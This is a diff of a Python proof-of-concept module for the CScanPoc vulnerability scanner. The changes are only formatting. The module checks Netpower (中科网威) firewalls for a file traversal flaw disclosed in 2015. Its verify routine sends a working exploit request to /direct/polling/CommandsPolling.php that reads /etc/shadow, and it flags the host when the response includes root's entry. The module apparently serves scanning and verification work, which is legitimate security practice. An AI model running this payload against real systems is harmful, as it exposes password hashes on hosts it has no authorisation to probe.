@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Netpower_0011' # 平台漏洞编号，留空
+    vuln_id = 'Netpower_0011'  # 平台漏洞编号，留空
     name = '中科网威防火墙 文件遍历'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_TRAVERSAL # 漏洞类型
+    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
     disclosure_date = '2015-09-16'  # 漏洞公布时间
     desc = '''
         中科网威防火墙 /direct/polling/CommandsPolling.php 函数逻辑错误，导致任意文件遍历。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '中科网威防火墙'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '73745102-3872-49c3-a1b2-dd2c21acf97a'
@@ -30,14 +32,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #info:http://www.wooyun.org/bugs/wooyun-2015-0140998
+
+            # info:http://www.wooyun.org/bugs/wooyun-2015-0140998
             hh = hackhttp.hackhttp()
             url = self.target + '/direct/polling/CommandsPolling.php'
             postdata = "command=ping&filename=/etc/shadow&cmdParam=qq.com"
             code, head, res, errcode, _ = hh.http(url, post=postdata)
             if code == 200 and '"data":["dealing","root' in res:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
